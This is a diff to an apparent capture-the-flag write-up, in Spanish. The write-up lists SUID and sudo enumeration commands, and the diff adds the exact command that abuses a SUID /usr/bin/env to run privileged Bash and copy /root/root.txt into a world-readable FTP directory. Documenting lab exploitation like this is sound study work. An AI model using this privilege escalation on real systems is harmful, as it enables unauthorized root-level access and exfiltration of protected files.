@@ -28,11 +28,11 @@ cd scripts
 get to_do.txt
 get clean.sh
 get removed_files.log
+get corgo2.jpg
+get puppos.jpeg
 ~~~~
 
-## Identidad, sudo y SUID
-
-El inventario local de la máquina registró:
+## Inventario delegado a clean.sh
 
 ~~~~bash
 id
@@ -40,8 +40,12 @@ sudo -n -l
 find / -type f -perm -4000 2>/dev/null
 ~~~~
 
-Resultado relevante: uid 1000 namelessone; sudo requería contraseña; /usr/bin/env tenía SUID.
+Resultado: uid 1000 namelessone; sudo requería contraseña; /usr/bin/env tenía SUID.
 
 ## Lectura de root.txt
 
-La copia de root.txt se hizo a través de /usr/bin/env y Bash privilegiado. El valor no se reproduce aquí. No se obtuvo una shell interactiva root.
+~~~~bash
+/usr/bin/env /bin/bash -p -c "cp /root/root.txt /var/ftp/scripts/root_flag.txt && chmod 644 /var/ftp/scripts/root_flag.txt"
+~~~~
+
+El archivo se descargó por FTP. Se omite su contenido. Esta evidencia confirma la lectura privilegiada de root.txt; no una shell interactiva root.
